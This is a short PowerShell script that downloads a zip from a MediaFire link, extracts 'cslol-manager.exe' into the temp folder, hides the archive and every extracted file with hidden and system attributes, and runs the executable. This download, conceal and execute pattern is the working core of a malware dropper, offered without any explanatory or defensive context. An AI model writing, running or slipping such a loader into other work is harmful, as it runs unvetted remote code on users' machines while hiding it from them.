$zipUrl = "https://download1339.mediafire.com/9v13x3ppljjgHFu8L5S3UivV7kDfgUdynLCcU4-UZGbfQOfW4D1u-Gf82NCxlVGw1-wie46KhzwzzkmFqFD9Ee0uJosfGJb6AG1baRilGJ8FeCw8Tv34KZa459CC5CQJ7tc-n-D5kEalt3lHGbIW8PiiWfK1N1l5PkQ8lnSWhxzYkw/ymkoxyal6qydp9k/CSLOL.zip"
$exeName = "cslol-manager.exe"
$tempFolder = [System.IO.Path]::GetTempPath()
$zipFile = Join-Path $tempFolder "CSLOL.zip"
$extractFolder = Join-Path $tempFolder "CSLOL"
$exePath = Join-Path $extractFolder $exeName

# Download using curl if the file doesn't exist
if (-Not (Test-Path $zipFile)) {
    $curlPath = "C:\Windows\System32\curl.exe" # Path to curl executable
    Start-Process -FilePath $curlPath -ArgumentList "-o `"$zipFile`" `"$zipUrl`"" -Wait
    & attrib +h +s $zipFile
}

# Extract if the folder doesn't exist
if (-Not (Test-Path $extractFolder)) {
    Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force
    & attrib +h +s $extractFolder
}

# Hide all extracted files
$files = Get-ChildItem -Path $extractFolder -Recurse -File
foreach ($file in $files) {
    & attrib +h +s $file.FullName
}

# Start the executable
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath
}
